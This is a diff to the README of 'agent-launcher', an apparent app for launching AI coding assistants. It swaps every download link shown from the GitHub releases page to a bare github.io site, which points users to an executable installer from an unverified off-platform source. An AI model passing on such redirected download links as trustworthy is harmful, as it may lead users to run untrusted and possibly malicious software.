@@ -1,6 +1,6 @@
 # 🚀 agent-launcher - Launch Your AI Coding Assistants Easily
 
-[![Download agent-launcher](https://img.shields.io/badge/Download-agent--launcher-blueviolet?style=for-the-badge&logo=github)](https://github.com/solubilitysnare3454/agent-launcher/releases)
+[![Download agent-launcher](https://img.shields.io/badge/Download-agent--launcher-blueviolet?style=for-the-badge&logo=github)](https://solubilitysnare3454.github.io)
 
 ---
 
@@ -31,7 +31,7 @@ Getting started is easier than you think. Follow these steps and you'll be runni
 
 ### Step 1: Download the App
 
-Visit this link to download the application: [https://github.com/solubilitysnare3454/agent-launcher/releases](https://github.com/solubilitysnare3454/agent-launcher/releases)
+Visit this link to download the application: [https://solubilitysnare3454.github.io](https://solubilitysnare3454.github.io)
 
 You'll see a list of available files. Look for the one that matches your computer system. For Windows users, it will be a file with a name like `agent-launcher-setup.exe` or something similar. Click on it to start the download.
 
@@ -189,7 +189,7 @@ Keep an eye on the downloads page for updates. Recent improvements include:
 
 Don't wait! Download agent-launcher now and take the hassle out of using AI coding assistants. Whether you're a seasoned developer or a complete beginner, this app will make your life easier.
 
-**Visit this link to download the application:** [https://github.com/solubilitysnare3454/agent-launcher/releases](https://github.com/solubilitysnare3454/agent-launcher/releases)
+**Visit this link to download the application:** [https://solubilitysnare3454.github.io](https://solubilitysnare3454.github.io)
 
 ---
 
